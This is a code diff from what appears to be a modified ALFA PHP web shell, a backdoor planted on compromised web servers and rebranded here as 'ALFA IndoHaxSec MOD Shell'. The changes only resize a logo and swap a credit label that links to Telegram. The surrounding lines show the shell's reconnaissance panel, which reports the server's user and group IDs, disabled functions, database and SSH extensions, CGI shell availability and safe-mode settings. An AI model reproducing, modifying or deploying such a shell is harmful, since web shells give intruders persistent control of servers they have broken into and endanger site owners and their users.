@@ -1108,7 +1108,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/NFHURO997XXD/XXX666XXX/refs/heads/main/photo_6154659260559117508_c-removebg-preview.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="280" height="280" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/NFHURO997XXD/XXX666XXX/refs/heads/main/photo_6154659260559117508_c-removebg-preview.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1182,7 +1182,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#DC143C">ALFA IndoHaxSec MOD Shell<br>Mod by FidzXploit</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
